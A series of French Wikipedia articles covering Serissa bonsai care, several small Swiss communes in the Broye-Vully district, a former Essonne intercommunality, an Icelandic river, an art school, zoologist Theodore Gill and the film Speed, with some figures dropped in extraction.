Le Serissa est communément vendu comme bonsaï. Il n'est pas difficile à tailler, mais il est plutôt exigeant en ce qui concerne les conditions environnementales. Il a tendance à perdre ses feuilles si le sol est trop humide ou trop sec, ou si la température est trop basse ou trop élevée. Il n'aime pas non plus être déplacé. Les feuilles repoussent généralement lorsque les conditions s'améliorent. Le Serissa étant d’origine subtropicale, il a besoin, en intérieur comme en extérieur, de beaucoup de lumière et d’humidité.
Son port en « plumeau » rend généralement cet arbuste facile à sculpter et donc idéal pour s'initier à l'art du bonsaï. La floraison peut se poursuivre épisodiquement pendant 4 à 5 mois après les premières pousses.
Le Serissa n’apprécie pas le calcaire, préférez une eau neutre pour l'arrosage.
Un substrat drainant favorisera le développement des radicelles et favorisera l'écoulement du surplus d'eau, le Serissa ayant horreur d’avoir les pieds dans l’eau et étant sensible à la pourriture des racines, qui est la cause principale de mortalité chez cette espèce. Utilisez une mélange avec 70 % d'Akadama, de Pouzzolane, de Pumice ou de gravier très fin et 30 % de terreau finement tamisé.
En hiver, il peut supporter des températures pouvant aller jusqu'à -5° sur de courtes périodes, mais il a besoin de repos. Une serre froide, un voile d'hivernage lui seront nécessaires pendant 3 ou 4 mois, afin qu'il ne s'épuise pas.
Taille et ligaturage.
La taille s'effectue de préférence au printemps (ou en automne dans les régions ou l'hiver est doux) lorsque les nouvelles pousses ont plus de 2 nœuds. La taille du tronc s'épaissit lentement. Les branches et rameaux sont plus rapides.
Pour ne pas épuiser l'arbre, on peut retirer les bourgeons qui apparaissent à la base du tronc (caractéristique du serissa).
Avec son écorce fragile, un bois et des racines très cassantes, il doit être manipulé avec précautions. Lors d'un rempotage, manipulez délicatement la motte de votre bonzaï. Réalisez des ligatures souples et surveillez les tensions afin de limiter le marquage de vos branches. Le bois est plus facile à travailler lorsque le bonsaï est « assoiffé ».
Cultivars.
Plusieurs cultivars à fleurs doubles ou à feuilles panachées sont disponibles. 'Pink Snow Rose' a des fleurs rose pâle et des feuilles bordées de blanc crème. Parmi les autres cultivars, on retrouve 'Variegata', 'Variegated Pink', 'Pink Mystic', 'Snowflake', 'Snowleaves', 'Mt. Fuji', 'Kyoto' et 'Sapporo'.
Problèmes phytosanitaires.
La chute ou le jaunissement des feuilles est bien souvent une réaction à une situation de stress (manque de lumière, changements d’emplacement, courants d’air, manque d'humidité).
Sa sève malodorante le protège de certains insectes, mais l’araignée rouge et les cochenilles sont à surveiller.
Le Serissa est sensible à la pourriture des racines (surtout lorsqu'il est dans un substrat non adapté) et peut être affecté par le Mildiou.

</doc>
<doc id="191774" url="https://fr.wikipedia.org/wiki?curid=191774" title="Missy (Vaud)">
Missy (Vaud)

Missy est un village et une commune suisse du canton de Vaud, située dans le district de la Broye-Vully. Cité dès 1148, il fait partie du district de Payerne entre 1798 et 2007. La commune est peuplée de habitants en . Son territoire, d'une surface de 305 hectares, de situe dans la plaine de la Broye.
Histoire.
Missy est mentionné en 1148 sous le nom de "Missiacum". Une nécropole du haut Moyen Âge se trouve sur le territoire de la commune. Au Moyen Âge, Missy appartient au prieuré de Payerne. Le seigneur de Grandcour y a des droits. Le village fait partie du gouvernement de Payerne à l'époque bernoise, de 1526 à 1798. Il est régi par un conseil des XII à cette époque. Il fait ensuite partie du district de Payerne de 1798 à 2007 et du district de la Broye-Vully depuis 2008. La chapelle est remplacée par un nouveau temple en 1810. Le village possède une société de fromagerie dès 1831.
Population.
Gentilé.
Les habitants de la commune se nomment les Missiriens ou les Missyriens.
Démographie.
Missy compte habitants en . Sa densité de population atteint hab./km.
En 1837, le décrit le village comme suit : 
En 2000, la population de Missy est composée de 134 hommes (48,7 %) et 141 femmes (51,3 %). La langue la plus parlée est le français, avec 248 personnes (87,6 %). La deuxième langue est l'allemand (28 ou 9,9 %). Il y a 267 Suisses (94,3 %) et 16 personnes étrangères (5,7 %). Sur le plan religieux, la communauté protestante est la plus importante avec 217 personnes (76,7 %), suivie des catholiques (42 ou 14,8 %). 14 personnes (4,9 %) n'ont aucune appartenance religieuse.
La population de Missy s’élève à 220 habitants en 1764, 224 en 1798, 270 en 1837, 282 en 1850, puis 404 en 1910. Après que le nombre d’habitants a diminué jusqu’à 252 en 1980, un faible accroissement de la population a été enregistré depuis lors. Le graphique suivant résume l'évolution de la population de Missy entre 1850 et 2010 :
Politique.
Lors des élections fédérales suisses de 2011, la commune a voté à 29,25 % pour l'Union démocratique du centre. Les deux partis suivants furent le Parti socialiste suisse avec 20,19 % des suffrages et le Parti libéral-radical avec 16,47 %.
Lors des élections cantonales au Grand Conseil de , les habitants de la commune ont voté pour le Parti libéral-radical à 31,26 %, l'Union démocratique du centre à 29,37 %, le Parti socialiste à 15,57 %, le Parti bourgeois démocratique et les Vert'libéraux à 13,13 %, les Verts à 10,46 % et Vaud Libre à 0,22 %.
Sur le plan communal, Missy (Vaud) est dirigé par une municipalité formée de 5 membres et dirigée par un syndic pour l'exécutif et un Conseil général comptant 43 membres en 2021, dirigé par une présidente, secondée par une secrétaire pour le législatif. Le Conseil général se réunit 4 fois par année et les séances sont ouvertes au public.
Économie.
Jusqu'à la seconde moitié du , l'économie communale était principalement tournée vers l'agriculture (en particulier des céréales, de la betterave à sucre et des légumes) et les cultures fruitières représentent une part importante des emplois locaux. Cependant, depuis ces dernières décennies, le village s'est développé avec la création de zones résidentielles occupées par des personnes, travaillant principalement à Payerne ; cette mutation s'est accompagnée par la création de différentes entreprises locales de service.
Transports.
Au niveau des transports en commun, Missy fait partie de la communauté tarifaire fribourgeoise Frimobil. Le bus des Transports publics fribourgeois faisant le parcours Domdidier-Portalban-Missy-Domdidier s'arrête dans la commune. Le village est aussi desservi par les bus sur appel Publicar, qui sont un service de CarPostal.
Vie locale.
La commune de Missy compte plusieurs associations, parmi lesquelles un club d'ainés, un chœur d'hommes, une école de musique et une société de jeunesse, de même que des clubs de football et de tir sportif, ainsi qu'une abbaye.

</doc>
<doc id="191775" url="https://fr.wikipedia.org/wiki?curid=191775" title="Sainte-Ligue">
Sainte-Ligue

Sainte-Ligue peut désigner :

</doc>
<doc id="191776" url="https://fr.wikipedia.org/wiki?curid=191776" title="Communauté d'agglomération du Val d'Yerres">
Communauté d'agglomération du Val d'Yerres

La communauté d’agglomération du Val d'Yerres (CAVY) est une ancienne structure intercommunale française située dans le département de l'Essonne et la région Île-de-France. 
Elle fusionne avec la communauté d'agglomération Sénart Val de Seine pour former la communauté d'agglomération Val d'Yerres Val de Seine (VYVS) le .
Histoire.
La communauté d’agglomération du Val d’Yerres a été créée par arrêté préfectoral du 22 mars 2002. 
En 2010, l'intercommunalité adhéra au syndicat mixte Paris Métropole.
Dans le cadre de la mise en œuvre de la loi MAPAM du , qui prévoit la généralisation de l'intercommunalité à l'ensemble des communes et la création d'intercommunalités de taille importante, le préfet de la région d'Île-de-France approuve le un schéma régional de coopération intercommunale qui prévoit notamment la « fusion de la communauté d'agglomération Sénart Val de Seine, de la communauté d'agglomération du Val d'Yerres et extension du nouveau regroupement à la commune de Varennes-Jarcy », jusqu'alors membre de la Communauté de communes du Plateau Briard. Celle-ci, après une consultation de ses habitants qui s'est tenue en avril 2015, intègre néanmoins la communauté de communes de l'Orée de la Brie le janvier 2016, de manière à ne pas être concernée par la Métropole du Grand Paris.
Les communes de Sénart Val de Seine s'opposent à la création, et le maire de Draveil, Georges Tron, organise un référendum dans sa ville, qui aboutit à un rejet de la fusion par 98,3 %, mais avec une participation limitée à 23 % des électeurs.
La création de la nouvelle communauté d'agglomération est néanmoins créée par arrêté préfectoral du 14 décembre 2015 « portant création d’un établissement public de coopération intercommunale issu de la fusion des communautés d’agglomération Sénart Val de Seine et Val d’Yerres ».
Territoire communautaire.
Géographie.
La communauté d’agglomération du Val d’Yerres était située à l’extrême nord-est du département de l’Essonne, à une altitude variant entre trente mètres à Crosne et cent seize mètres à Yerres.
Composition.
La communauté d’agglomération du Val d’Yerres regroupait six communes :
Démographie.
Histogramme de l’évolution démographique.
Fonctionnement.
Siège.
La communauté d'agglomération avait son siège statutaire à Brunoy, rue des Ombrages.
Élus.
La Communauté d'agglomération était administrée par son "conseil communautaire" constitué, pour le mandat 2014-2015, de 49 conseillers communautaires. Ceux-ci sont également des conseillers municipaux représentant chacune des communes membres, à raison de : 
Le conseil communautaire du 8 avril 2014 a réélu son président, Nicolas Dupont-Aignan, député-maire de Yerres et ses onze vice-présidents.
Ensemble, ils formaient le bureau de l'intercommunalité pour le mandat 2014-2015.
Compétences.
La communauté d’agglomération du Val d’Yerres exerçait les compétences qui lui étaient transférées par les communes membres, conformément aux dispositions du code général des collectivités territoriales. Il s'agissait du développement économique, de l’aménagement du territoire, de l’équilibre social de l’habitat et de la politique de la ville, ainsi que de la protection de l’environnement, la collecte et tri des ordures ménagères, la distribution de l’eau potable et le traitement des eaux usées ainsi que de la gestion des équipements culturels et sportifs.
Régime fiscal et budget.
La communauté d'agglomération était financée par la "fiscalité professionnelle unique" (FPU), qui a succédé a la Taxe professionnelle unique (TPU), et qui assure une péréquation fiscale entre les communes regroupant de nombreuses entreprises et les communes résidentielles.
La communauté d’agglomération du Val d’Yerres disposait en 2008 d’un budget de euros.

</doc>
<doc id="191780" url="https://fr.wikipedia.org/wiki?curid=191780" title="Rossens (Vaud)">
Rossens (Vaud)

Rossens est une localité et une ancienne commune suisse du canton de Vaud, située dans la commune de Villarzel et le district de la Broye-Vully.
Histoire.
Rossens fut mentionné dès 1176 sous son nom actuel. Le village était une seigneurie de la châtellenie de Villarzel relevant directement de l'évêque de Lausanne, appartenant en 1335 à Gérard de Dizy et à sa femme Agnès de Billens. Il passa par achat ou mariage en de nombreuses mains : aux Rey, aux Maillard, aux Moratel en 1591, aux Zehender en 1630, aux Herbort en 1742, enfin aux Miéville en 1796, propriétaires de la maison appelée « château ». Rossens fit partie du bailliage de Moudon sous l'Ancien Régime (1536-1798) et fut ensuite attribué aux districts de Moudon (1798-1803), puis de Payerne (1803-2006). Au spirituel, Rossens releva de la paroisse de Villarzel dès 1622 et de celle de Granges-près-Marnand depuis 2000. Le village est resté rural (92 % des emplois dans le secteur primaire en 2005).
Le , la commune a fusionné avec Sédeilles et Villarzel pour former la nouvelle commune de Villarzel.
Démographie.
Rossens compte 4 feux en 1741 puis 28 habitants en 1764, 67 en 1850, 77 en 1900, 59 en 1950 et 46 en 2000.

</doc>
<doc id="191781" url="https://fr.wikipedia.org/wiki?curid=191781" title="Markarfljót">
Markarfljót

La Markarfljót est un fleuve du Sud de l’Islande.
Géographie.
Les eaux de ce fleuve proviennent surtout des glaciers Mýrdalsjökull, notamment les sources du Mælifellssandur, et Eyjafjallajökull. Le fleuve est déjà assez important à ses débuts. Le fleuve est assez bien connu pour ses gorges Markarfljótsgljúfur, accessibles en quelques minutes depuis le refuge d'Ermstrur, et aussi parce qu’il traverse la région de la Þórsmörk constituée de moyennes montagnes et de vallées où se trouvent de nombreuses possibilités pour des randonnées (dont le célèbre trek de la Laugavegur). La Krossá est l'une des rivières se jetant dans la Markarfljót. Le Þverá est une diffluence qui se sépare du cours principal pour se jeter dans l'Ytri-Rangá.
Sa longueur est de cent kilomètres.
Le débit le plus élevé jamais mesurée sur ce fleuve fut de /s lors du jökulhlaup de 1967.

</doc>
<doc id="191782" url="https://fr.wikipedia.org/wiki?curid=191782" title="École européenne supérieure de l'image">
École européenne supérieure de l'image

L’École européenne supérieure de l’image Angoulême – Poitiers est une école supérieure d’art publique placée sous la tutelle du ministère de la Culture. Elle accueille près de 350 étudiantes et étudiants sur ses deux sites -Angoulême et Poitiers - et prépare aux diplômes nationaux d’arts plastiques aux niveaux licence, master et doctorat. Le projet de l’étudiant occupe une place centrale dans le schéma des études de l’ÉESI, qui privilégie l’expérimentation, la collaboration et l’enrichissement mutuel. 
Les objectifs fixés par son conseil d’administration relèvent de la mise en réseau européen et international de ses activités, du renforcement de ses capacités à conduire des recherches, ainsi que du développement de ses laboratoires. Développement devant permettre une attractivité européenne en matière d’accueil de programmes de recherches artistiques.
Dans cette configuration multi-site particulière, la pédagogie affirme la vocation transversale de l’école tant d’un point de vue géographique que des contenus qu’elle dispense.
Les enseignements s’organisent autour de phases de durées et de d’octroi de crédits (ECTS) conformes à l’harmonisation des diplômes européens selon les accords de Bologne (diplômes de niveaux : trois, cinq et huit années d’études).
En marge de chaque édition du festival de bande dessinée d’Angoulême, l’école décerne un prix de bande dessinée depuis 1995. Stoppé en 2011, il reprendra 6 ans après en 2017.
Depuis , l’École européenne supérieure de l'image a ouvert un post-diplôme international, Document et art contemporain destiné à de jeunes artistes, théoriciens ou curateurs désireux d’expérimenter une année de recherche.
Histoire.
L’école d’art de Poitiers a été créée en 1768 sous le nom d’école royale académique de peinture, sculpture, architecture et arts analogues au dessin. L’école des beaux-arts d’Angoulême a été créée en 1972, qui est aussi (les événements ne sont pas liés) l’année de la création du festival de bande dessinée. L’implantation actuelle de l'école, dans l'ancienne usine à papier du Nil, date de 1987. Le rapprochement entre les écoles de Poitiers et d'Angoulême date de 1990, la création d'un syndicat mixte de 1995, la constitution d'un groupement d’intérêt public de 2000 et, enfin, la création d’un établissement public de coopération culturelle (EPCC), de 2011.
Administration.
Depuis la réforme LMD, l'établissement délivre des diplômes aux niveaux Licence, Master et Doctorat. Le DNA (diplôme national d’arts) comme le DNSEP (diplôme national supérieur d’expression plastique) sont homologués par le ministère de la Culture et de la communication. Le premier propose les mentions bande dessinée et images animées quand le second dispense les mentions bande dessinée et création numérique .
En partenariat avec l'Université de Poitiers, l'EESI propose également un Master recherche en Bande dessinée ainsi qu'un Doctorat de création Expression artistique et littéraire spécialité Bande dessinée.
En parallèle de ce partenariat, l'EESI est habilitée à délivrer depuis 2014 un DSRA (Diplôme Supérieur de Recherche en Art) à l'endroit du post-diplôme Document et art contemporain. Cette formation qui s'étale sur trois années, s'adresse à des artistes, des critiques d'autant qu'à des commissaires ou des cinéastes.

</doc>
<doc id="191783" url="https://fr.wikipedia.org/wiki?curid=191783" title="École Supérieure de l'Image">
École Supérieure de l'Image



</doc>
<doc id="191784" url="https://fr.wikipedia.org/wiki?curid=191784" title="Sédeilles">
Sédeilles

Sédeilles est une localité et une ancienne commune suisse du canton de Vaud, située dans la commune de Villarzel et le district de la Broye-Vully.
Histoire.
Sédeilles fut mentionné sous les noms de Sideles en 1190 (incertain) et Sedilles en 1336. Des vestiges d'un établissement romain furent réoccupés par des tombes du haut Moyen Âge. Sédeilles faisait partie, au Moyen Âge, du domaine temporel de l'évêque de Lausanne (châtellenie de Villarzel). Le couvent de Hautcrêt et les prémontrés d'Humilimont y avaient des possessions avant 1536 ; ces dernières passèrent aux jésuites de Fribourg et furent acquises par Berne en 1750. À l'époque bernoise, le village fut intégré au bailliage de Moudon (1536-1798) ; il fut ensuite rattaché au district de Payerne (1798-2006).
Au spirituel, Sédeilles releva de la paroisse de Granges-près-Marnand, puis forma en 1622 une paroisse avec Villarzel et Rossens, qui fut à nouveau jointe à celle de Granges en 2000. La grande salle date de 1976 et la station d'épuration de 1994. En 2000, trois cinquièmes de la population active étaient des pendulaires ; le primaire offrait encore 44 % des emplois en 2005.
Le , la commune a fusionné avec Rossens et Villarzel pour former la nouvelle commune de Villarzel.
Démographie.
Sédeilles compte 7 feux en 1741 puis 126 habitants en 1803, 195 en 1850, 214 en 1900, 205 en 1950, 120 en 1990 et 144 en 2000.
Monuments.
École (1841). Intéressant bâtiment élevé par les architectes lausannois Henri Perregaux et Achille de La Harpe.

</doc>
<doc id="191786" url="https://fr.wikipedia.org/wiki?curid=191786" title="Trey (Vaud)">
Trey (Vaud)

Trey est une commune suisse du canton de Vaud, située dans le district de la Broye-Vully. Citée dès le , elle fait partie du district de Payerne entre 1798 et 2007. La commune est peuplée de habitants en . Son territoire, d'une surface de 379 hectares, se situe dans la région de la Broye.
Histoire.
Le territoire de la commune est habité dès la préhistoire. On y a trouvé des tombes de l'âge du bronze et de La Tène et des habitations de l'époque romaine. Le village est cité pour la première fois en 1138 sous le nom de "Treis" avant de prendre les noms successifs de "Trais" (en 1142), "Trees" (1213), "Treys" (1254) et "Treyz" (1311).
Derrière le village, se dresse une colline boisée qui sépare les villages de Trey et de Granges-sous-Trey. Devant celle-ci se dresse un monticule où un château est construit au Moyen Âge et incendié en 1410 par les Lausannois. Séparée du canton de Berne en 1536 pour rejoindre celui de Vaud, la commune fait partie, pendant la période de la République helvétique entre 1798 et 1803 du canton du Léman avant de retrouver le canton de Vaud à la mise en application de l'acte de médiation. L'église du village est construite en 1796 grâce à une donation d'un habitant et deux ans plus tard, la commune est rattachée au district de Payerne.
Le , plusieurs maisons du village sont détruites dans un incendie. Ce qui n'empêche pas le village de se développer dans les années suivantes. L'ancien collège est construit en 1845, puis la gare est inaugurée en 1876 (construite, selon la légende, grâce à l'appui de Charles Estoppey, enfant du lieu élu au Conseil national, puis au conseil fédéral mais qui a refusé cette dernière élection). En 1886, Fritz Cornamusaz, instituteur au village, créé au village un pensionnat qui porta son nom et qui existe jusqu'à l'été 2001.
Vers la fin du , d'importants travaux ont été entrepris pour canaliser le lit de la Broye, à l'origine de plusieurs inondations. Les digues réalisées à cette époque n'ont cédé qu'une seule fois, lors des crues de décembre 1944. Une passerelle, construite en 1903 et rénovée en 1993, relie le village au hameau de Brit sur la commune de Valbroye.
Population.
Surnom.
Les habitants de la commune sont surnommés les "Betatzards" ou "Betatsare" (ceux qui portent une besace en patois vaudois).
Démographie.
Trey compte habitants en . Sa densité de population atteint hab./km.
En 2000, la population de Trey est composée de 104 hommes (46,4 %) et 120 femmes (53,6 %). La langue la plus parlée est le français, avec 206 personnes (92 %). La deuxième langue est l'allemand (14 ou 6,3 %). Il y a 208 Suisses (92,9 %) et 16 personnes étrangères (7,1 %). Sur le plan religieux, la communauté protestante est la plus importante avec 169 personnes (75,4 %), suivie des catholiques (28 ou 12,5 %). 20 personnes (8.9 %) n'ont aucune appartenance religieuse.
La population de Trey est de 460 habitants en 1850 et reste relativement stable jusqu'en 1910. Elle baisse ensuite régulièrement jusqu'à une stabilisation à environ 250 habitants dans les années 1970. Le graphique suivant résume l'évolution de la population de Trey entre 1850 et 2010 :
Politique.
Lors des élections fédérales suisses de 2011, la commune a voté à 48,07 % pour l'Union démocratique du centre. Les deux partis suivants furent le Parti libéral-radical avec 24,68 % des suffrages et le Parti socialiste suisse avec 7,46 %.
Lors des élections cantonales au Grand Conseil de , les habitants de la commune ont voté pour le Parti libéral-radical à 55,48 %, le Parti socialiste à 18,78 %, les Verts à 11,24 %, l'Union démocratique du centre à 8,25 %, le Parti bourgeois démocratique et les Vert'libéraux à 5,69 % et Vaud Libre à 0,57 %.
Sur le plan communal, Trey est dirigé par une municipalité formée de 5 membres et dirigée par un syndic pour l'exécutif et un Conseil général dirigé par un président et secondé par un secrétaire pour le législatif.
Sociétés locales.
La commune possède plusieurs sociétés locales dont la "société de jeunesse", née au début des années 1920 qui possède une bannière de 1923.
Le est organisé à Trey par le moto-club de Payerne un motocross international. Jusqu'en 1966, huit éditions seront mises sure pied dont deux manches de championnat suisse en 1958 et 1959, une manche de championnat d'Europe en 1960 (), quatre manches de championnat du Monde, en 1961 (), 1963 (), 1964 () et 1966 (), ainsi qu'un trophée des nations () en 1965.
Enfin, la commune organise chaque année depuis 1993 les "Aérolfiades de Trey", une exhibition de montgolfières.
Monuments.
Le village de Trey est inscrit comme site ISOS.
Économie.
Jusque dans la seconde moitié du , l'économie communale était principalement centrée sur l'agriculture et l'élevage qui representent encore de nos jours une part importante de l'activité. Depuis, plusieurs entreprises locales de service se sont créées, principalement dans le village de Trey qui est devenu un lieu de résidence pour des personnes, principalement travaillant à Payerne.
Jusqu'à sa fermeture en 2009, la commune a accueilli sur son sol l"'Institut de jeunes gens Cornamusaz", renommé "Institut de Trey" en 2001.
Transports.
La gare qui se situe sur la ligne des Chemins de fer fédéraux qui relie Lausanne à Payerne n’est plus desservie depuis fin 2017. Mais Le village est desservi par la ligne de bus CarPostal reliant Romont à Payerne.
Le village est aussi desservi par les bus sur appel Publicar, qui sont un service de CarPostal.

</doc>
<doc id="191788" url="https://fr.wikipedia.org/wiki?curid=191788" title="Mél">
Mél



</doc>
<doc id="191790" url="https://fr.wikipedia.org/wiki?curid=191790" title="Theodore Nicholas Gill">
Theodore Nicholas Gill

Theodore Nicholas Gill est un zoologiste américain, né le à New York et mort le à Washington, D.C.
Biographie.
Il est le fils d’Elizabeth (née Vosburgh) et de James Darrel Gill. Orphelin de mère à neuf ans, il est éduqué d'abord par des précepteurs puis fait des études classiques, notamment de grec et de latin, dans des écoles privées. Il étudie brièvement le droit dans l'entreprise de son oncle, mais n'est pas tenté par une carrière juridique.
Il découvre les poissons en traversant tous les jours un marché en allant à l'école. Vers 1855, il rencontre le naturaliste William Stimpson (1832-1872), grâce à lui, il entre en contact avec le grand zoologiste américain Spencer Fullerton Baird (1823-1887). Ce dernier fait paraître un article de Gill dans le rapport annuel de la Smithsonian Institution.
Baird le fait participer à une expédition dans les Caraïbes en 1858 où il récolte de nombreux spécimens de poissons. En 1859, il part à Terre-Neuve. De retour au Smithsonian, il collabore à la préparation du rapport sur les collections assemblées par le Northwest Boundary Survey sous la direction d'Archibald Campbell (1813-1887). Il fréquente alors d'autres protégés de Baird comme Robert Kennicott (1835-1866), Fielding Bradford Meek (1817-1876) ou Ferdinand Vandeveer Hayden (1828-1887).
Parallèlement, de 1860 à 1861, il est l'assistant des professeurs de physique et d'histoire naturelle du Columbian College. En 1862, il devient bibliothécaire à la bibliothèque de la Smithsonian Institution, puis en 1866, assistant-bibliothécaire à la Bibliothèque du Congrès.
Il obtient son "Master of Arts" en 1865, son doctorat en médecine en 1866 puis, en 1870, son Ph. D. à l'université George Washington. Il continue à donner des cours au Columbian College de 1864 à 1866 ainsi que de 1873 à 1884. Durant les années 1870, il commence à étudier les mammifères, les amphibiens, les oiseaux et les mollusques. Il devient membre de l'American Ornithologists' Union (AOU) où il participe notamment aux travaux relatifs à la taxinomie (notamment à ceux qui conduisent à l’adoption du Code de nomenclature de l’AOU et de la Liste des oiseaux nord-américains).
En 1884, il y obtient une chaire de zoologie, fonction qu'il conserve jusqu'à sa retraite en 1910 où il est nommé professeur émérite. Il obtient un Doctorat honorifique en droit en 1895 de l’université George Washington.
Il fait paraître plus de 500 articles scientifiques, principalement en ichtyologie. Il est considéré comme l'un des maîtres de la taxinomie, en particulier au niveau de la famille et de l'ordre. David Starr Jordan (1851-1931) dira de lui qu’il est un "ichtyologiste, un philosophe, un critique, un maître en taxinomie", George Brown Goode (1851-1896) qu’il est "le plus érudit et philosophe des naturalistes américains". Gill fait partie de plus de 70 sociétés savantes dont l’American Association for the Advancement of Science (qu’il préside en 1897), la National Academy of Sciences (1873), l’American Philosophical Society, membre étranger de la Zoological Society of London. Il ne s’est jamais marié.

</doc>
<doc id="191792" url="https://fr.wikipedia.org/wiki?curid=191792" title="Speed (film, 1994)">
Speed (film, 1994)

 ou Clanches! au Québec est un film d'action américain réalisé par Jan de Bont et sorti en 1994. Il a rapidement été propulsé au rang de "blockbuster". Une suite, ", est sortie en 1997. Le film est un remake de Super Express 109 de Jun'ya Satō sorti en 1975.
Synopsis.
Howard Payne, terroriste psychopathe, policier à la retraite, prend en otage un ascenseur dans un immeuble d'affaires à Los Angeles et réclame une rançon en menaçant de le faire sauter. Son projet échoue à cause de deux officiers du SWAT, Jack Traven et son partenaire Harry Temple, qui parviennent à évacuer les otages. Payne arrive à prendre Temple en otage mais est pris complètement au dépourvu quand Traven blesse délibérément son coéquipier pour le rendre inutilisable en tant qu'otage. Il décide alors de faire exploser le C4 qu'il avait placé sur son torse et de se faire passer pour mort. Pour se venger, Payne pose une bombe dans un bus, qui risque d'exploser si la vitesse passe en dessous de (soit ) ou si quelqu'un essaie de descendre. Jack Traven réussit à monter dans le bus. Commence alors un véritable casse-tête pour l'officier du SWAT, qui doit trouver par tous les moyens comment désamorcer la bombe accrochée à l'essieu du bus.
Entre-temps, Jack connait d'autres problèmes ; Ray, un délinquant armé, se sent menacé lorsque Jack annonce aux passagers qu'il est policier, croyant qu'il est là pour l'arrêter ; il le menace avec son arme et blesse involontairement le chauffeur du bus. Le chauffeur blessé est remplacé par une passagère du bus, Annie Porter. Harry Temple, le coéquipier de Jack, est mis au courant par le commandant du SWAT, le capitaine Herb 'Mac' McMahon, que le terroriste est revenu. Jack réussit à contacter Harry, qui lui vient en aide par téléphone afin de désamorcer la bombe. Mais la bombe est reliée à une montre et il est impossible de faire une dérivation du circuit, car la configuration de l'engin explosif ne le permet pas. Le chef du SWAT et Harry tentent de trouver des solutions pour aider Jack. McMahon décide de faire descendre les passagers, mais le terroriste appelle Jack par téléphone et refuse que quelqu'un tente de descendre, sinon il fera exploser la bombe. Seul le chauffeur est autorisé à descendre, après négociation avec le terroriste. Une vieille passagère terrifiée essaie alors de profiter du pont avec les policiers et de descendre, mais une petite bombe explose, la projetant sous les roues du véhicule où elle meurt, écrasée, le corps réduit en charpie ; il s'agissait d'un avertissement de la part du terroriste pour montrer qu'il ne plaisante pas. Après cette explosion, Jack est confronté à d'autres aléas, sur l'autoroute où le bus se trouve ; un membre du SWAT annonce qu'une portion de passerelle de est manquante. Jack met tout en œuvre avec ses coéquipiers à l'extérieur du bus pour passer cette passerelle.
Le passage réussi, Jack a l'idée d'amener le bus dans un aéroport afin de gagner du temps pour se défaire de ce piège. Jack demande l'autorisation au terroriste pour sortir du bus, qui accepte tout en lui disant qu'il le surveille. Avec l'aide de son chef, Jack parvient à se glisser seul sous le bus qui continue à rouler sur les pistes, pour tenter de désamorcer la bombe. Sa tentative se soldant par un échec, Jack se retrouve à nouveau dans le bus. Pendant ce temps-là, Harry réussit à trouver le nom du terroriste et décide de se rendre chez lui avec une escouade du SWAT pour l'arrêter, mais il tombe dans un piège qui lui coûte la vie. Jack est informé par le terroriste que son ami Harry est mort, ce qui le plonge dans une colère noire. Il découvre que le terroriste les surveille grâce à une caméra cachée derrière le rétroviseur intérieur. Il a alors l'idée de faire rediffuser plusieurs fois la même séquence vidéo pour tromper la surveillance du terroriste et d'évacuer les passagers en les transférant dans un autre bus. Une fois les passagers en sécurité, il ne reste plus que Jack et Annie à bord du bus à la dérive à cause de ses pneus éclatés. Ils bloquent la pédale d'accélérateur pour maintenir l'allure du bus avant de parvenir à en descendre par le plancher. Le bus est ensuite détruit par l'explosion de la bombe, emportant avec lui un avion. Le terroriste, ne sachant pas que son plan a échoué, pense aller récupérer sa rançon et découvre juste avant qu'il s'est de nouveau fait avoir par Jack.
Par conséquent, il change ses plans et, portant un uniforme de police, il va à la rencontre d'Annie qui attend près de l'ambulance qui les a amenés, elle et Jack, sur le lieu choisi par le terroriste pour le dépôt de la rançon. Jack se rend compte que la rançon a déjà été subtilisée par le terroriste et décide d'aller voir de plus près. Il voit Annie avec une ceinture d'explosifs placée par le terroriste, qui tiré la leçon de sa dernière rencontre avec Traven. Howard Payne, furieux, amène Annie dans un métro tout en narguant Jack. Celui-ci parvient quand même à monter sur le toit du métro. Payne découvre rapidement que Jack est sur le métro et tente de lui proposer la moitié de la rançon, mais celle-ci était piégée et un marqueur indélébile destiné à marquer les billets comme volés, rendant la rançon totalement inutilisable. Enragé par ce nouveau piège, Payne engage un combat à mains nues avec Jack sur le toit, et meurt finalement décapité après avoir heurté une borne lumineuse avec sa tête à pleine vitesse. Jack retourne auprès d'Annie, mais ne parvient pas à la libérer des menottes. Il décide de faire dérailler le métro et se retrouve projeté sur une route en plein Los Angeles. Ayant survécu à l'accident, Jack et Annie finissent par s'embrasser sous les yeux de touristes qui prennent des photos.
Sortie et accueil.
Critique.
Le film a reçu des critiques positives et a un score de 94 % sur Rotten Tomatoes basé sur 63 commentaires, avec une note moyenne de . Le consensus critique est le suivant : . Le film a également une note de Sur Metacritic basée sur 17 critiques indiquant "Critiques globalement favorables".
Box-office.
Le film a été un grand succès commercial. Aux États-Unis, le film a engrangé plus de dollars de recettes dès son premier week-end. Il totalisera finalement dollars sur le sol américain ( plus gros succès au box-office de l'année 1994), et  dollars dans le monde pour un budget d'environ 30 millions de dollars.
En France, le film a totalisé , se classant en du box-office 1994.

</doc>
<doc id="191793" url="https://fr.wikipedia.org/wiki?curid=191793" title="Treytorrens (Broye-Vully)">
Treytorrens (Broye-Vully)

Treytorrens est une commune suisse du canton de Vaud, située dans le district de la Broye-Vully. Citée dès 1194, elle fait partie du district de Payerne entre 1798 et 2007. La commune est peuplée de habitants en . Son territoire, d'une surface de 310 hectares, se situe sur les collines séparant le lac de Neuchâtel de la vallée de la Broye.
Géographie.
La surface totale de la commune de Treytorrens représente 310 hectares qui se décomposent en : 15 ha de surfaces d'habitat et d'infrastructure, 231 ha de surfaces agricoles, 64 ha de surfaces boisées et enfin moins d'un hectare de surfaces improductives (lacs et cours d'eau par exemple). Dans le détail en 2004, les aires industrielles et artisanales représentent moins de 1 % du territoire communal, les maisons et bâtiments 1,61 %, les routes et infrastructures de transport 2,90 %, les zones agricoles 59,03 % et les zones arboricoles et viticoles moins de 1 %.
Jusqu'à sa dissolution, la commune faisait partie du district de Payerne. Depuis le , elle fait partie du nouveau district de la Broye-Vully. Elle a des frontières communes avec Valbroye, Chavannes-le-Chêne et Champtauroz dans le canton de Vaud, ainsi qu'Estavayer et Nuvilly dans le canton de Fribourg.
Le territoire communal s'étend sur les collines séparant le lac de Neuchâtel de la vallée de la Broye. La partie orientale de la commune se trouve dans la vallée de la Petite Glâne ; à l'est de la rivière se trouve la forêt Le Chanex. À l'ouest, la commune est bordée par le Bois du Mont dans lequel se trouve le point culminant de la commune à 733 mètres d'altitude. Enfin, au nord se trouvent les terres communales de Cudrex et de Grands Champs.
En plus du village de Treytorrens, la commune comte également le hameau des Molliettes situé au bord de la Petite Glâne ainsi que plusieurs fermes isolées.
Toponymie.
